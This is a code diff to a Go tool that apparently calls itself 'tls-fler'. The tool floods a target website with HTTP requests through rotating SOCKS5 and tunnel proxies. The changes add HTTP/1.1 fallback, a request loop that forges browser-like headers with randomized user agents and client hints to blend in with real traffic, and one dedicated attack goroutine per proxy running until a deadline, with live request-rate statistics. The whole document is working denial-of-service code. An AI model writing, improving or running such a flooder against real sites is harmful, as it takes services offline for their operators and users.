@@ -50,8 +50,10 @@ var (
 	statReq      int64
 	statOK       int64
 	statErr      int64
-	statProxyOK  int64 // successful proxy connections
-	statProxyErr int64 // failed proxy connections
+	statProxyOK  int64
+	statProxyErr int64
+	statH2       int64 // connections negotiated as h2
+	statH1       int64 // connections negotiated as http/1.1
 )
 
 // ── proxy ─────────────────────────────────────────────────────────────────────
@@ -272,6 +274,15 @@ func (pp *ProxyPool) Len() int {
 	return len(pp.list)
 }
 
+// Snapshot returns a copy of all proxies at this moment
+func (pp *ProxyPool) Snapshot() []Proxy {
+	pp.mu.RLock()
+	defer pp.mu.RUnlock()
+	out := make([]Proxy, len(pp.list))
+	copy(out, pp.list)
+	return out
+}
+
 // ── dial proxy → raw TCP tunnel → TLS h2 ─────────────────────────────────────
 
 func dialSOCKS5(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
@@ -358,18 +369,18 @@ func dialTunnel(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
 	}
 }
 
-// dialH2 returns a *tls.Conn with h2 negotiated, tunnelled via proxy
-func dialH2(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
+// dialMix: negotiate h2 atau http/1.1, return conn + proto string
+func dialMix(px Proxy, targetHost string, targetPort int) (net.Conn, string, error) {
 	tunnel, err := dialTunnel(px, targetHost, targetPort)
 	if err != nil {
-		return nil, err
+		return nil, "", err
 	}
 
 	tlsCfg := &tls.Config{
 		ServerName:         targetHost,
 		InsecureSkipVerify: true,
-		// force ALPN h2 — server MUST negotiate h2
-		NextProtos:       []string{"h2"},
+		// tawarkan h2 dan http/1.1 — pakai yang server support
+		NextProtos:       []string{"h2", "http/1.1"},
 		MinVersion:       tls.VersionTLS12,
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
 		CipherSuites: []uint16{
@@ -389,14 +400,14 @@ func dialH2(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
 	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
 	if err := tlsConn.Handshake(); err != nil {
 		tlsConn.Close()
-		return nil, fmt.Errorf("TLS: %w", err)
+		return nil, "", fmt.Errorf("TLS: %w", err)
 	}
-	if proto := tlsConn.ConnectionState().NegotiatedProtocol; proto != "h2" {
-		tlsConn.Close()
-		return nil, fmt.Errorf("h2 not negotiated (got %q)", proto)
+	proto := tlsConn.ConnectionState().NegotiatedProtocol
+	if proto == "" {
+		proto = "http/1.1"
 	}
 	tlsConn.SetDeadline(time.Time{})
-	return tlsConn, nil
+	return tlsConn, proto, nil
 }
 
 // ── HTTP/2 raw frame helpers ──────────────────────────────────────────────────
@@ -459,6 +470,65 @@ func buildPath(u *url.URL) string {
 		return p + "&" + q
 	}
 	return p + "?" + q
+}
+
+// ── HTTP/1.1 session ──────────────────────────────────────────────────────────
+
+func runSessionH1(conn net.Conn, u *url.URL, deadline time.Time) {
+	defer conn.Close()
+	br := bufio.NewReader(conn)
+	for time.Now().Before(deadline) {
+		path := buildPath(u)
+		ua := uaPool[rand.Intn(len(uaPool))]
+		secChUa := secChUaPool[rand.Intn(len(secChUaPool))]
+		isMobile := rand.Intn(100) < 35
+		mobileVal, platformVal := "?0", `"Windows"`
+		if isMobile {
+			mobileVal, platformVal = "?1", `"Android"`
+		}
+
+		var req bytes.Buffer
+		fmt.Fprintf(&req, "GET %s HTTP/1.1\r\n", path)
+		fmt.Fprintf(&req, "Host: %s\r\n", u.Hostname())
+		fmt.Fprintf(&req, "User-Agent: %s\r\n", ua)
+		fmt.Fprintf(&req, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")
+		fmt.Fprintf(&req, "Accept-Encoding: gzip, deflate, br, zstd\r\n")
+		fmt.Fprintf(&req, "Accept-Language: en-US,en;q=0.9\r\n")
+		fmt.Fprintf(&req, "Cache-Control: no-cache\r\n")
+		fmt.Fprintf(&req, "Sec-Ch-Ua: %s\r\n", secChUa)
+		fmt.Fprintf(&req, "Sec-Ch-Ua-Mobile: %s\r\n", mobileVal)
+		fmt.Fprintf(&req, "Sec-Ch-Ua-Platform: %s\r\n", platformVal)
+		fmt.Fprintf(&req, "Sec-Fetch-Dest: document\r\n")
+		fmt.Fprintf(&req, "Sec-Fetch-Mode: navigate\r\n")
+		fmt.Fprintf(&req, "Sec-Fetch-Site: none\r\n")
+		fmt.Fprintf(&req, "Sec-Fetch-User: ?1\r\n")
+		fmt.Fprintf(&req, "Upgrade-Insecure-Requests: 1\r\n")
+		fmt.Fprintf(&req, "Connection: keep-alive\r\n\r\n")
+
+		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+		if _, err := conn.Write(req.Bytes()); err != nil {
+			return
+		}
+		atomic.AddInt64(&statReq, 1)
+
+		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+		resp, err := http.ReadResponse(br, nil)
+		if err != nil {
+			return
+		}
+		io.Copy(io.Discard, resp.Body)
+		resp.Body.Close()
+
+		if resp.StatusCode >= 200 && resp.StatusCode < 500 {
+			atomic.AddInt64(&statOK, 1)
+		} else {
+			atomic.AddInt64(&statErr, 1)
+		}
+
+		if resp.Header.Get("Connection") == "close" {
+			return
+		}
+	}
 }
 
 // ── HTTP/2 session — send raw HEADERS frames ──────────────────────────────────
@@ -598,19 +668,27 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 	}
 }
 
-// ── worker ────────────────────────────────────────────────────────────────────
+// ── worker — 1 goroutine per proxy, loop terus tanpa antri ───────────────────
 
-func worker(pool *ProxyPool, u *url.URL, port, rps int, deadline time.Time, wg *sync.WaitGroup) {
+// workerForProxy: 1 proxy dedicated, buka koneksi terus sampai deadline
+func workerForProxy(px Proxy, u *url.URL, port int, deadline time.Time, wg *sync.WaitGroup) {
 	defer wg.Done()
 	for time.Now().Before(deadline) {
-		px := pool.Pick()
-		conn, err := dialH2(px, u.Hostname(), port)
+		conn, proto, err := dialMix(px, u.Hostname(), port)
 		if err != nil {
 			atomic.AddInt64(&statProxyErr, 1)
+			time.Sleep(500 * time.Millisecond)
 			continue
 		}
 		atomic.AddInt64(&statProxyOK, 1)
-		runSession(conn, u, rps, deadline)
+
+		if proto == "h2" {
+			atomic.AddInt64(&statH2, 1)
+			runSession(conn, u, 0, deadline)
+		} else {
+			atomic.AddInt64(&statH1, 1)
+			runSessionH1(conn, u, deadline)
+		}
 	}
 }
 
@@ -670,30 +748,20 @@ func main() {
 
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
-	// workers = rate / 128 rps-per-conn
-	rpsPerConn := 128
-	workers := rate / rpsPerConn
-	if workers < 1 {
-		workers = 1
-	}
-	if workers > 30000 {
-		workers = 30000
-	}
-	rpsPerWorker := rate / workers
-	if rpsPerWorker < 1 {
-		rpsPerWorker = 1
-	}
+	// 1 goroutine per proxy — semua proxy jalan sekaligus, tidak antri
+	proxies := pool.Snapshot()
+	workers := len(proxies)
 
 	deadline := time.Now().Add(time.Duration(duration) * time.Second)
 
-	fmt.Printf("\n[tls-fler] target=%s duration=%ds rate=%d/s workers=%d proxies=%d\n\n",
-		u.Hostname(), duration, rate, workers, pool.Len())
+	fmt.Printf("\n[tls-fler] target=%s duration=%ds rate=%d/s proxies=%d (each gets dedicated goroutine)\n\n",
+		u.Hostname(), duration, rate, workers)
 
 	start := time.Now()
 	var wg sync.WaitGroup
-	for i := 0; i < workers; i++ {
+	for _, px := range proxies {
 		wg.Add(1)
-		go worker(pool, u, port, rpsPerWorker, deadline, &wg)
+		go workerForProxy(px, u, port, deadline, &wg)
 	}
 
 	// live stats every 3s
@@ -711,12 +779,14 @@ func main() {
 			if total > 0 {
 				pct = float64(pOK) / float64(total) * 100
 			}
-			fmt.Printf("[stats] req=%d ok=%d err=%d rps=%d | proxy ok=%d err=%d (%.1f%%)\n",
+			fmt.Printf("[stats] req=%d ok=%d err=%d rps=%d | proxy ok=%d err=%d (%.1f%%) | h2=%d h1=%d\n",
 				cur,
 				atomic.LoadInt64(&statOK),
 				atomic.LoadInt64(&statErr),
 				rps,
 				pOK, pErr, pct,
+				atomic.LoadInt64(&statH2),
+				atomic.LoadInt64(&statH1),
 			)
 		}
 	}()
@@ -735,5 +805,7 @@ func main() {
 	fmt.Printf("Avg RPS       : %.0f\n", float64(statReq)/elapsed)
 	fmt.Printf("Proxy OK      : %d\n", pOK)
 	fmt.Printf("Proxy Err     : %d\n", pErr)
+	fmt.Printf("H2 conns      : %d\n", atomic.LoadInt64(&statH2))
+	fmt.Printf("H1 conns      : %d\n", atomic.LoadInt64(&statH1))
 	fmt.Println("=============================")
 }
